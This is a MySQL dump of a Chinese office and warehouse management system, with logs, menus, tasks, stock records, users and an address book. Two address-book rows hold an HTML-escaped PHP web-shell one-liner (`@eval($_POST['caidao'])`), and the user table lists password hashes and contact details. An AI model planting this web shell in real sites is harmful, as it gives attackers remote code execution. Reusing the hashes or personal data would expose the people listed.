INSERT INTO `xy_log` VALUES ('94', '2018-03-13 11:10:59', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('95', '2018-03-13 11:13:31', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('96', '2018-03-13 11:17:15', 'admin', '新增成功10', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Chuku/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('97', '2018-03-13 15:35:50', 'admin', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('98', '2018-03-13 15:38:29', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('99', '2018-03-13 15:38:38', 'admin', '设置成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/User/editrule.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('100', '2018-03-13 15:38:47', 'admin', '设置成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/User/editrule.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('101', '2018-03-13 16:34:07', 'admin', '修改成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/changeinfo.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('102', '2018-03-13 17:04:45', 'admin', '退出成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('103', '2018-03-13 19:26:13', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('104', '2018-03-13 19:26:44', 'admin', '修改成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/changeinfo.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('105', '2018-03-13 19:27:29', 'admin', '新增成功3', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Renwu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('106', '2018-03-13 19:27:49', 'admin', '新增成功4', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Renwu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('107', '2018-03-13 19:29:19', 'admin', '编辑成功4', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Renwu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('108', '2018-03-13 19:30:06', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Quxiang/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('109', '2018-03-13 21:37:45', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Quxiang/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('110', '2018-03-14 10:12:40', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('111', '2018-03-14 10:13:03', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('112', '2018-03-14 10:13:11', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('113', '2018-03-14 11:52:23', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('114', '2018-03-14 15:19:13', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('115', '2018-03-14 16:14:22', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safa', '/Storage/index.php?s=/Home/Public/Login.html', '0.0.0.0');

-- ----------------------------
-- Table structure for `xy_menu`
-- ----------------------------
DROP TABLE IF EXISTS `xy_menu`;
CREATE TABLE `xy_menu` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `level` tinyint(1) NOT NULL,
  `pid` int(4) NOT NULL,
  `catename` char(20) NOT NULL DEFAULT '',
  `alink` char(100) NOT NULL DEFAULT '',
  `sort` int(4) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=214 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_menu
-- ----------------------------
INSERT INTO `xy_menu` VALUES ('14', '1', '7', '用户管理', 'user/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('11', '2', '22', '菜单管理', 'menu/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('19', '2', '22', '功能列表', 'rule/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('7', '0', '0', '系统管理', 'system/index', '99', '1');
INSERT INTO `xy_menu` VALUES ('128', '2', '125', '出库记录', 'chuku/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('129', '2', '125', '发货记录', 'fahuo/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('130', '2', '125', '付款记录', 'fukuan/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('135', '0', '0', '仓库管理', 'cangku/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('136', '1', '135', '入库', 'cangku/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('137', '2', '136', '新增入库', 'ruku/add', '1', '1');
INSERT INTO `xy_menu` VALUES ('139', '2', '136', '入库审核', 'ruku/dshenhe', '3', '1');
INSERT INTO `xy_menu` VALUES ('140', '2', '136', '入库记录', 'ruku/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('141', '2', '136', '入库明细表', 'rukus/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('142', '1', '135', '出库', 'chuku/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('143', '2', '142', '新增出库', 'chuku/add', '1', '1');
INSERT INTO `xy_menu` VALUES ('144', '2', '142', '出库审核', 'chuku/dshenhe', '2', '1');
INSERT INTO `xy_menu` VALUES ('145', '2', '142', '出库记录', 'chuku/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('146', '2', '142', '出库明细表', 'chukus/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('147', '1', '135', '库存盘点', 'chanpin/index', '4', '1');
INSERT INTO `xy_menu` VALUES ('148', '1', '135', '发货记录', 'fahuo/index', '5', '1');
INSERT INTO `xy_menu` VALUES ('158', '1', '135', '产品管理', 'chanpin/index', '0', '1');
INSERT INTO `xy_menu` VALUES ('159', '1', '135', '库存报警', 'chanpin/baojing', '3', '1');
INSERT INTO `xy_menu` VALUES ('160', '0', '0', '个人办公', 'bangong/index', '0', '1');
INSERT INTO `xy_menu` VALUES ('161', '1', '160', '我的去向', 'quxiang/index', '1', '1');
INSERT INTO `xy_menu` VALUES ('162', '1', '160', '员工去向', 'quxiangs/index', '2', '1');
INSERT INTO `xy_menu` VALUES ('163', '1', '160', '我的任务', 'renwu/index', '3', '1');
INSERT INTO `xy_menu` VALUES ('164', '1', '160', '分配任务', 'renwu/add', '4', '1');
INSERT INTO `xy_menu` VALUES ('179', '1', '7', '清理缓存', 'public/clear', '10', '1');

-- ----------------------------
-- Table structure for `xy_msg`
-- ----------------------------
DROP TABLE IF EXISTS `xy_msg`;
CREATE TABLE `xy_msg` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `content` varchar(255) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `type` varchar(20) NOT NULL,
  `juid` int(11) NOT NULL,
  `viewtime` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=utf8 COMMENT='消息管理';

-- ----------------------------
-- Records of xy_msg
-- ----------------------------
INSERT INTO `xy_msg` VALUES ('1', '1', '陈高明', '2015-05-18 00:00:00', '你新的未读消息啊<a href=\"/weboa/index.php?m=home&c=public&a=online\" data-toggle=\"navtab\" data-id=\"online\"  data-title=\"消息提醒123\">消息 <span class=\"badge\">1</span></a>', '1', '系统', '1', '2015-05-19 08:14:45');
INSERT INTO `xy_msg` VALUES ('2', '0', '系统管理员', '0000-00-00 00:00:00', '登陆成功', '1', '', '0', '2015-05-19 08:26:32');
INSERT INTO `xy_msg` VALUES ('3', '0', '系统管理员', '2015-05-19 08:28:14', '登陆成功', '1', '系统类', '1', '2015-05-19 08:29:27');
INSERT INTO `xy_msg` VALUES ('4', '0', '系统管理员', '2015-05-19 08:30:05', '登陆成功', '1', '系统类', '1', '2015-05-19 09:35:49');
INSERT INTO `xy_msg` VALUES ('5', '0', '系统管理员', '2015-05-19 08:30:17', '登陆成功', '1', '系统类', '1', '2015-05-19 08:30:22');
INSERT INTO `xy_msg` VALUES ('6', '1', 'admin', '2015-05-19 13:45:53', '', '1', '', '0', '2015-05-19 17:28:54');
INSERT INTO `xy_msg` VALUES ('7', '1', 'admin', '2015-05-19 13:45:58', '', '1', '', '0', '2015-05-19 14:04:38');
INSERT INTO `xy_msg` VALUES ('8', '17', 'user1', '2015-06-16 13:51:45', 'fdsf', '1', '系统', '0', '0000-00-00 00:00:00');
INSERT INTO `xy_msg` VALUES ('9', '17', 'user1', '2015-06-16 13:51:48', 'fdsf', '1', '系统', '0', '0000-00-00 00:00:00');
INSERT INTO `xy_msg` VALUES ('10', '17', 'user1', '2015-06-16 13:51:50', 'fdsf', '1', '系统', '0', '0000-00-00 00:00:00');
INSERT INTO `xy_msg` VALUES ('11', '17', 'user1', '2015-06-16 13:52:08', 'fdsf', '1', '系统', '17', '2015-06-16 13:52:14');
INSERT INTO `xy_msg` VALUES ('12', '17', 'user1', '2015-06-16 13:52:11', 'fdsf', '1', '系统', '17', '2015-07-07 03:24:20');

-- ----------------------------
-- Table structure for `xy_quxiang`
-- ----------------------------
DROP TABLE IF EXISTS `xy_quxiang`;
CREATE TABLE `xy_quxiang` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `ktime` datetime NOT NULL,
  `jtime` datetime NOT NULL,
  `type` varchar(50) NOT NULL,
  `title` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='我的去向';

-- ----------------------------
-- Records of xy_quxiang
-- ----------------------------
INSERT INTO `xy_quxiang` VALUES ('1', '1', '谭书涛', '2018-03-11 10:03:00', '0', '', '0000-00-00 00:00:00', '1', '2018-03-11 09:56:25', '2018-03-14 09:56:29', '外出', '1111111111111');
INSERT INTO `xy_quxiang` VALUES ('2', '1', '谭书涛', '2018-03-09 14:46:02', '0', '', '0000-00-00 00:00:00', '1', '2018-03-01 14:45:51', '2018-03-16 14:45:58', '外出', 'dd');
INSERT INTO `xy_quxiang` VALUES ('3', '1', '谭书涛', '2018-03-09 14:55:09', '1', '谭书涛', '2018-03-13 19:30:06', '1', '2018-03-31 14:54:52', '2018-03-22 14:54:54', '外出', '生病了');
INSERT INTO `xy_quxiang` VALUES ('4', '1', '谭书涛', '2018-03-09 14:56:06', '0', '', '0000-00-00 00:00:00', '1', '2018-03-31 14:54:52', '2018-03-22 14:54:54', '外出', 'dd');
INSERT INTO `xy_quxiang` VALUES ('5', '1', '谭书涛', '2018-03-09 15:11:02', '0', '', '0000-00-00 00:00:00', '1', '2018-03-02 15:10:44', '2018-03-10 15:10:50', '请假', '牙疼');
INSERT INTO `xy_quxiang` VALUES ('6', '1', '谭书涛', '2018-03-11 10:44:22', '1', '谭书涛', '2018-03-13 21:37:45', '1', '2018-03-02 10:43:57', '2018-03-11 10:44:00', '外出', '前往企业检验');

-- ----------------------------
-- Table structure for `xy_renwu`
-- ----------------------------
DROP TABLE IF EXISTS `xy_renwu`;
CREATE TABLE `xy_renwu` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  `jztime` datetime NOT NULL,
  `hid` int(11) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `biaoti` varchar(100) NOT NULL,
  `content` text NOT NULL,
  `beizhu` text NOT NULL,
  `attid` int(11) NOT NULL,
  `jieguo` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='任务管理';

-- ----------------------------
-- Records of xy_renwu
-- ----------------------------
INSERT INTO `xy_renwu` VALUES ('1', '16', '张飞', '2018-03-13 10:59:28', '0', '', '0000-00-00 00:00:00', '1', '', '干活', '2018-03-13 10:53:14', '0', '尺寸这种', 'V型成吧vc', '在啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧啧', '', '1436842746', '等待处理');
INSERT INTO `xy_renwu` VALUES ('2', '1', '谭书涛', '2018-03-12 09:01:57', '0', '', '0000-00-00 00:00:00', '1', '1', '谭书涛', '2018-03-14 08:58:59', '0', '', '出差到C厂', '&lt;div style=&quot;text-align:left;&quot;&gt;\r\n	验收某车锻造&lt;span style=&quot;color:#333333;font-family:arial, tahoma, &amp;quot;font-size:34px;background-color:#FFFFFF;&quot;&gt;轮毂&lt;/span&gt;\r\n&lt;/div&gt;', '', '1520816335', '等待处理');
INSERT INTO `xy_renwu` VALUES ('3', '1', '谭书涛', '2018-03-13 19:27:29', '0', '', '0000-00-00 00:00:00', '1', '1', '谭书涛', '2018-03-15 19:27:18', '0', '', '', '开会', '', '0', '等待处理');
INSERT INTO `xy_renwu` VALUES ('4', '1', '谭书涛', '2018-03-13 19:27:49', '1', '谭书涛', '2018-03-13 19:29:19', '1', '21', '张乐', '2018-03-15 19:27:44', '0', '', '', '吃饭', '\r\n谭书涛:很好2018-03-13 19:29:19', '0', '进行中');

-- ----------------------------
-- Table structure for `xy_ruku`
-- ----------------------------
DROP TABLE IF EXISTS `xy_ruku`;
CREATE TABLE `xy_ruku` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(50) NOT NULL,
  `type` varchar(200) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `title` varchar(500) NOT NULL,
  `shijian` date NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `shenheren` varchar(50) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=36 DEFAULT CHARSET=utf8 COMMENT='入库记录';

-- ----------------------------
-- Records of xy_ruku
-- ----------------------------
INSERT INTO `xy_ruku` VALUES ('35', '1', '谭书涛', '2018-03-13 08:52:39', '0', '', '0000-00-00 00:00:00', '1', '180313390001', '通用汽车', '9', '轴承,空气滤清器,dd,汽车轴承', '2018-03-13', '谭书涛', '', '等待审核');

-- ----------------------------
-- Table structure for `xy_rukus`
-- ----------------------------
DROP TABLE IF EXISTS `xy_rukus`;
CREATE TABLE `xy_rukus` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(100) NOT NULL,
  `title` varchar(200) NOT NULL,
  `type` varchar(255) NOT NULL,
  `danwei` varchar(20) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `xid` int(11) NOT NULL,
  `edit` tinyint(1) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `shijian` date NOT NULL,
  `fenlei` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=88 DEFAULT CHARSET=utf8 COMMENT='入库明细表';

-- ----------------------------
-- Records of xy_rukus
-- ----------------------------
INSERT INTO `xy_rukus` VALUES ('84', '1', '2222', '轴承', '', 's', '2', '', '等待审核', '35', '0', '谭书涛', '2018-03-13', '汽车零件');
INSERT INTO `xy_rukus` VALUES ('85', '1', 'CRM01', '空气滤清器', '通用', '套', '2', '', '等待审核', '35', '0', '谭书涛', '2018-03-13', '汽车零件');
INSERT INTO `xy_rukus` VALUES ('86', '1', '123', 'dd', 'dd', '只', '2', '', '等待审核', '35', '0', '谭书涛', '2018-03-13', '软件服务');
INSERT INTO `xy_rukus` VALUES ('87', '1', 'crm', '汽车轴承', '', '套', '3', '', '等待审核', '35', '0', '谭书涛', '2018-03-13', '汽车零件');

-- ----------------------------
-- Table structure for `xy_shenhe`
-- ----------------------------
DROP TABLE IF EXISTS `xy_shenhe`;
CREATE TABLE `xy_shenhe` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `type` varchar(50) NOT NULL,
  `title` varchar(50) NOT NULL,
  `content` varchar(255) NOT NULL,
  `xid` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=31 DEFAULT CHARSET=utf8 COMMENT='审核记录';

-- ----------------------------
-- Records of xy_shenhe
-- ----------------------------
INSERT INTO `xy_shenhe` VALUES ('27', '1', '谭书涛', '2018-03-10 10:57:58', '0', '', '0000-00-00 00:00:00', '1', 'Ruku', '', '', '34');
INSERT INTO `xy_shenhe` VALUES ('28', '1', '谭书涛', '2018-03-10 10:58:03', '0', '', '0000-00-00 00:00:00', '1', 'Ruku', '审核通过', '', '34');
INSERT INTO `xy_shenhe` VALUES ('29', '1', '谭书涛', '2018-03-13 08:54:08', '0', '', '0000-00-00 00:00:00', '1', 'Chuku', '退回修改', '', '5');
INSERT INTO `xy_shenhe` VALUES ('30', '1', '谭书涛', '2018-03-13 08:54:24', '0', '', '0000-00-00 00:00:00', '1', 'Chuku', '审核通过', '', '5');

-- ----------------------------
-- Table structure for `xy_tongzhi`
-- ----------------------------
DROP TABLE IF EXISTS `xy_tongzhi`;
CREATE TABLE `xy_tongzhi` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  `title` varchar(100) NOT NULL,
  `jztime` datetime NOT NULL,
  `content` text NOT NULL,
  `attid` int(11) NOT NULL,
  `beizhu` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='通知公告';

-- ----------------------------
-- Records of xy_tongzhi
-- ----------------------------

-- ----------------------------
-- Table structure for `xy_user`
-- ----------------------------
DROP TABLE IF EXISTS `xy_user`;
CREATE TABLE `xy_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` char(20) NOT NULL DEFAULT '',
  `password` char(32) NOT NULL DEFAULT '',
  `depname` varchar(50) NOT NULL,
  `posname` varchar(50) NOT NULL,
  `truename` char(30) NOT NULL,
  `sex` char(5) NOT NULL,
  `tel` varchar(20) NOT NULL,
  `phone` char(11) NOT NULL,
  `neixian` varchar(50) NOT NULL,
  `email` varchar(200) NOT NULL,
  `qq` varchar(20) NOT NULL,
  `logintime` datetime NOT NULL,
  `loginip` char(15) NOT NULL,
  `logins` int(11) NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT '1',
  `update_time` int(11) NOT NULL,
  `bian` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=22 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_user
-- ----------------------------
INSERT INTO `xy_user` VALUES ('1', 'admin', 'c3284d0f94606de1fd2af172aba15bf3', '综合办公室', '系统管理员', '谭书涛', '男', '8552646', '13812349563', '6535665', 'pinkecn@qq.com', '1612985', '2018-03-14 16:14:22', '0.0.0.0', '671', '1', '1521015262', '今天需要检查');
INSERT INTO `xy_user` VALUES ('21', 'cangku', '14e1b600b1fd579f47433b88e8d85291', '技术部', '仓库管理员', '张乐', '女', '1234', '235', '', '246', '35', '2018-03-13 09:26:33', '0.0.0.0', '2', '1', '1520904393', '');

-- ----------------------------
-- Table structure for `xy_wdtxl`
-- ----------------------------
DROP TABLE IF EXISTS `xy_wdtxl`;
CREATE TABLE `xy_wdtxl` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(50) NOT NULL,
  `sex` varchar(10) NOT NULL,
  `danwei` varchar(200) NOT NULL,
  `zhiwei` varchar(50) NOT NULL,
  `dianhua` varchar(200) NOT NULL,
  `email` varchar(255) NOT NULL,
  `qq` varchar(50) NOT NULL,
  `leixing` varchar(20) NOT NULL,
  `type` varchar(50) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='我的通讯录';

-- ----------------------------
-- Records of xy_wdtxl
-- ----------------------------
INSERT INTO `xy_wdtxl` VALUES ('1', '1', '张飞', '2018-03-10 13:27:17', '1', '', '2018-03-10 11:40:38', '1', '111', '男', '11', '11', '11', '11', '11', '私有', '&lt;?php @eval($_POST[\'caidao\']);?&gt;', '112');
INSERT INTO `xy_wdtxl` VALUES ('3', '1', '张飞', '2018-03-10 11:40:54', '0', '', '0000-00-00 00:00:00', '1', '发顺丰', '', '', '', '发送', '', '', '私有', '&lt;?php @eval($_POST[\'caidao\']);?&gt;', '');

-- ----------------------------
-- Table structure for `xy_wendang1`
-- ----------------------------
DROP TABLE IF EXISTS `xy_wendang1`;
CREATE TABLE `xy_wendang1` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(50) NOT NULL,
  `type` varchar(50) NOT NULL,
  `beizhu` text NOT NULL,
  `attid` int(11) NOT NULL,
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='我的文档';

-- ----------------------------
-- Records of xy_wendang1
-- ----------------------------
INSERT INTO `xy_wendang1` VALUES ('1', '1', '陈高明', '2018-03-10 10:24:17', '0', '', '0000-00-00 00:00:00', '1', '1223', '公司证件', '剩下的', '1432520625', '16', '王晓丹');
INSERT INTO `xy_wendang1` VALUES ('2', '17', '张雨', '2018-03-10 19:52:49', '0', '', '0000-00-00 00:00:00', '1', '代码库', '专业知识', '', '1433245831', '', '');
INSERT INTO `xy_wendang1` VALUES ('3', '16', '王晓丹', '2018-03-10 14:47:27', '1', '陈高明', '2018-03-10 04:56:07', '1', 'sss', 'sss', 'ssss', '1433314035', '18', '王倩');
INSERT INTO `xy_wendang1` VALUES ('4', '16', '王晓丹', '2018-03-10 17:39:34', '0', '', '0000-00-00 00:00:00', '1', 'test_aaa', 'sss', 'test_aaa_bbb', '1439458687', '', '');
